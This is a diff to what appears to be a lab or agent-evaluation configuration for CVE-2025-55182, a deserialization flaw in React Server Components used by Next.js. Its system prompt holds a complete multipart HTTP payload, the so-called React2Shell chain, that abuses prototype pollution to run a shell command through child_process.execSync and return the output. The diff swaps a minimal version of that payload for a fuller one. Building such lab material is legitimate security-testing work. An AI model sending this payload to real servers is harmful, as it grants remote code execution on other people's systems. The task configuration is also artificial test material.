@@ -6,7 +6,7 @@ meta:
   tags: [cve, nextjs, react, nodejs, deserialization, rce]
 
 box:
-  compose_dir: "~/vulhub-master/react/CVE-2025-5518"
+  compose_dir: "~/vulhub-master/react/CVE-2025-55182"
   # اگر مسیر Vulhub برای این CVE موجود نبود، از lab اختصاصی استفاده کنید:
   # compose_dir: "~/labs/cve-2025-55182"
   teardown: down
@@ -40,10 +40,9 @@ system_prompt: |
   side.
   The lab exposes a vulnerable Server Action. Send a POST to `/` with a
   multipart body that contains the malicious Flight chunk.
-  Output ONLY this JSON object on one line (this is the minimal
-  React2Shell payload for `id`; adapt the boundary if needed):
-  {"method":"POST","path":"/","headers":{"Content-Type":"multipart/form-data; boundary=----WebKitFormBoundaryx","Next-Action":"x"},"body":"------WebKitFormBoundaryx\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\n{\"then\":\"$1:__proto__:constructor:constructor\"}\r\n------WebKitFormBoundaryx\r\nContent-Disposition: form-data; name=\"1\"\r\n\r\n{\"then\":\"$B\"}\r\n------WebKitFormBoundaryx\r\nContent-Disposition: form-data; name=\"2\"\r\n\r\n$@1\r\n------WebKitFormBoundaryx\r\nContent-Disposition: form-data; name=\"3\"\r\n\r\n{\"then\":\"$1:constructor:constructor\"}\r\n------WebKitFormBoundaryx--\r\n"}
-
+  Output ONLY this JSON object on one line. This payload uses the
+  complete prototype-pollution chain and executes `id` via `_prefix`.
+  {"method":"POST","path":"/","headers":{"Content-Type":"multipart/form-data; boundary=----WebKitFormBoundaryX7jK9mP2qR3vN4wL","Next-Action":"x"},"body":"------WebKitFormBoundaryX7jK9mP2qR3vN4wL\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\n{\"then\":\"$1:__proto__:then\",\"status\":\"resolved_model\",\"reason\":-1,\"value\":\"{\\\"then\\\":\\\"$B1337\\\"}\",\"_response\":{\"_prefix\":\"var res=process.mainModule.require('child_process').execSync('id').toString();throw Object.assign(new Error('NEXT_REDIRECT'),{digest:res});\",\"_formData\":{\"get\":\"$1:constructor:constructor\"}}}\r\n------WebKitFormBoundaryX7jK9mP2qR3vN4wL\r\nContent-Disposition: form-data; name=\"1\"\r\n\r\n\"$@0\"\r\n------WebKitFormBoundaryX7jK9mP2qR3vN4wL--\r\n"}
   Notes:
   - The exact `Next-Action` ID and boundary may differ per build. If the
     response is a generic 404 or 500 with no command output, the action
